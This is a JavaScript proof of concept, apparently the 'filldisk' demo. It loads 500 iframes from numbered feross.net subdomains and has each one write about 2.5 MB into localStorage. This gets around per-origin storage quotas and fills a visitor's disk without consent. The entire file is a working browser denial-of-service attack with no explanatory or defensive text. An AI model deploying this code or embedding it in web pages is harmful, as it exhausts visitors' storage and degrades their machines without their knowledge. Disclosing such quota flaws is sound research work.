var frameNum = 0
  , body = document.getElementsByTagName('body')[0]

$(function() {
  if (window.top == window.self) {
    for (var i = 0; i < 500; i++) {
      var iframe = document.createElement('iframe')
      iframe.src = 'http://' + i + '.feross.net/filldisk/'
      body.appendChild(iframe)
    }
  }
})

// The following code adapted from http://arty.name/localstorage.html

function repeat(string, count) {
    var array = [];
    while (count--) {
  array.push(string);
    }
    return array.join('');
}

var n10b =    '0123456789';
var n100b =   repeat(n10b, 10);
var n1kib =   repeat(n100b, 10);
var n10kib =  repeat(n1kib, 10);
var n100kib = repeat(n10kib, 10);
var n25mib =   repeat(n100kib, 25);

// Set 2.5 MB
try {
  localStorage.filldisk = n25mib;
} catch (e) {
  alert('local storage exception')
}

